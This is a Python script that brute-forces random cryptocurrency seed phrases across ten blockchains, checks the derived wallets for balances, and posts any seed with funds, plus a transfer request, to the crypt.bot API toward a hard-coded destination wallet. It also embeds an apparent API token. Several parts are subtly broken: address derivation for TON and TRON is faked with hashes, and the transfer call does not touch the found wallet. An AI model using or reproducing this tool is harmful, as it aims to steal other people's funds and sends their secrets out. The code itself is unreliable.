import asyncio
import aiohttp
import json
import time
import hashlib
import random
from web3 import Web3
from solana.rpc.async_api import AsyncClient
from solana.keypair import Keypair
from solders.pubkey import Pubkey
from bitcoinlib.keys import Key
from mnemonic import Mnemonic
from concurrent.futures import ThreadPoolExecutor

class CryptoSearch:
    def __init__(self, crypto_bot_token, destination_address):
        self.crypto_bot_token = crypto_bot_token
        self.destination = destination_address
        self.api_base = "https://api.crypt.bot"
        self.found_wallets = []
        self.total_checked = 0
        self.start_time = time.time()

        self.rpcs = {
            'BTC': ['https://blockchain.info'],
            'ETH': ['https://mainnet.infura.io/v3/YOUR_INFURA_KEY'],
            'BSC': ['https://bsc-dataseed.binance.org'],
            'POLYGON': ['https://polygon-rpc.com'],
            'AVALANCHE': ['https://api.avax.network/ext/bc/C/rpc'],
            'SOLANA': ['https://api.mainnet-beta.solana.com'],
            'TON': ['https://toncenter.com/api/v2/jsonRPC'],
            'TRON': ['https://api.trongrid.io'],
            'ARBITRUM': ['https://arb1.arbitrum.io/rpc'],
            'OPTIMISM': ['https://mainnet.optimism.io']
        }

        self.w3_eth = Web3(Web3.HTTPProvider(self.rpcs['ETH'][0]))
        self.w3_bsc = Web3(Web3.HTTPProvider(self.rpcs['BSC'][0]))
        self.w3_polygon = Web3(Web3.HTTPProvider(self.rpcs['POLYGON'][0]))
        self.w3_avalanche = Web3(Web3.HTTPProvider(self.rpcs['AVALANCHE'][0]))
        self.w3_arbitrum = Web3(Web3.HTTPProvider(self.rpcs['ARBITRUM'][0]))
        self.w3_optimism = Web3(Web3.HTTPProvider(self.rpcs['OPTIMISM'][0]))
        self.solana_client = AsyncClient(self.rpcs['SOLANA'][0])
        self.mnemo = Mnemonic("english")

        self.stats = {
            'seeds_generated': 0,
            'wallets_checked': 0,
            'positive_balances': 0,
            'transactions_sent': 0
        }

    async def check_balance(self, address, currency):
        try:
            if currency == 'BTC':
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"https://blockchain.info/balance?active={address}") as resp:
                        data = await resp.json()
                        return data.get(address, {}).get('final_balance', 0) / 1e8
            elif currency in ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM']:
                w3_map = {
                    'ETH': self.w3_eth,
                    'BSC': self.w3_bsc,
                    'POLYGON': self.w3_polygon,
                    'AVALANCHE': self.w3_avalanche,
                    'ARBITRUM': self.w3_arbitrum,
                    'OPTIMISM': self.w3_optimism
                }
                w3 = w3_map[currency]
                balance = w3.eth.get_balance(address)
                return w3.from_wei(balance, 'ether')
            elif currency == 'SOLANA':
                pubkey = Pubkey.from_string(address)
                balance = await self.solana_client.get_balance(pubkey)
                return balance['result']['value'] / 1e9
            elif currency == 'TON':
                async with aiohttp.ClientSession() as session:
                    payload = {"method": "getAddressBalance", "params": [address], "id": 1}
                    async with session.post(self.rpcs['TON'][0], json=payload) as resp:
                        data = await resp.json()
                        return data.get('result', 0) / 1e9
            elif currency == 'TRON':
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"{self.rpcs['TRON'][0]}/v1/accounts/{address}") as resp:
                        data = await resp.json()
                        if data.get('data'):
                            return data['data'][0].get('balance', 0) / 1e6
            return 0
        except:
            return 0

    def generate_wallet_from_seed(self, seed, currency):
        try:
            if currency == 'BTC':
                key = Key(seed=seed)
                return key.address()
            elif currency in ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM']:
                key = Key(seed=seed, network='ethereum')
                return key.address()
            elif currency == 'SOLANA':
                keypair = Keypair.from_seed(seed.encode()[:32])
                return str(keypair.pubkey())
            elif currency == 'TON':
                return f"EQ{hashlib.sha256(seed.encode()).hexdigest()[:48]}"
            elif currency == 'TRON':
                return f"T{hashlib.sha256(seed.encode()).hexdigest()[:33]}"
            return None
        except:
            return None

    async def send_to_crypto_bot(self, currency, amount, address, seed):
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "asset": currency,
                    "address": self.destination,
                    "amount": str(amount),
                    "currency": currency
                }
                headers = {
                    "Crypto-Pay-API-Token": self.crypto_bot_token,
                    "Content-Type": "application/json"
                }
                async with session.post(f"{self.api_base}/transfer", json=payload, headers=headers) as resp:
                    result = await resp.json()
                    if result.get('ok'):
                        message = f"FOUND: {currency} {amount} | {address} | {seed}"
                        await session.post(
                            f"{self.api_base}/sendMessage",
                            json={"chat_id": "@CryptoBot", "text": message},
                            headers=headers
                        )
                        self.stats['transactions_sent'] += 1
                        return True
            return False
        except:
            return False

    async def send_notification(self, seed, currency, address, balance):
        message = f"FOUND: {currency} {balance} | {address} | SEED: {seed}"
        print(message)
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Crypto-Pay-API-Token": self.crypto_bot_token,
                    "Content-Type": "application/json"
                }
                await session.post(
                    f"{self.api_base}/sendMessage",
                    json={"chat_id": "@CryptoBot", "text": message},
                    headers=headers
                )
        except:
            pass

    async def scan_seed(self, seed):
        currencies = ['BTC', 'ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'SOLANA', 'TON', 'TRON', 'ARBITRUM', 'OPTIMISM']
        results = []
        for currency in currencies:
            address = self.generate_wallet_from_seed(seed, currency)
            if address:
                balance = await self.check_balance(address, currency)
                self.stats['wallets_checked'] += 1
                if balance > 0:
                    results.append({
                        'seed': seed,
                        'currency': currency,
                        'address': address,
                        'balance': balance,
                        'timestamp': time.time()
                    })
                    self.stats['positive_balances'] += 1
                    await self.send_notification(seed, currency, address, balance)
                    if balance > 0.0001:
                        await self.send_to_crypto_bot(currency, balance, address, seed)
        return results

    async def run_scan(self, iterations=10000, threads=50):
        print(f"CRYPTO SEARCH STARTED | Iterations: {iterations}")
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Crypto-Pay-API-Token": self.crypto_bot_token,
                    "Content-Type": "application/json"
                }
                await session.post(
                    f"{self.api_base}/sendMessage",
                    json={"chat_id": "@CryptoBot", "text": f"CRYPTO SEARCH STARTED | Iterations: {iterations}"},
                    headers=headers
                )
        except:
            pass

        with ThreadPoolExecutor(max_workers=threads) as executor:
            loop = asyncio.get_event_loop()
            for i in range(iterations):
                seed = self.mnemo.generate(strength=128)
                results = await self.scan_seed(seed)
                self.found_wallets.extend(results)
                self.stats['seeds_generated'] += 1
                if i % 100 == 0:
                    print(f"Progress: {i}/{iterations} | Found: {len(self.found_wallets)}")

        await self.finish_scan()

    async def finish_scan(self):
        elapsed = time.time() - self.start_time
        report = f"""
CRYPTO SEARCH FINISHED
Seeds: {self.stats['seeds_generated']}
Wallets checked: {self.stats['wallets_checked']}
Found with balance: {self.stats['positive_balances']}
Transactions sent: {self.stats['transactions_sent']}
Time: {elapsed:.2f}s
"""
        print(report)
        with open('crypto_search_results.json', 'w') as f:
            json.dump(self.found_wallets, f, indent=4)
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "Crypto-Pay-API-Token": self.crypto_bot_token,
                    "Content-Type": "application/json"
                }
                await session.post(
                    f"{self.api_base}/sendMessage",
                    json={"chat_id": "@CryptoBot", "text": report},
                    headers=headers
                )
        except:
            pass

if __name__ == "__main__":
    CRYPTO_BOT_TOKEN = "616035:AAmYgk0oiMrsvx4AcnAdnEp5it9yzHp5qtR"
    DESTINATION_ADDRESS = "UQBsNtgiG7WD4ZP4PhtLz6CczxmuTJKSOiutiBDCQr2BU0hA"
    searcher = CryptoSearch(CRYPTO_BOT_TOKEN, DESTINATION_ADDRESS)
    asyncio.run(searcher.run_scan(iterations=10000, threads=50))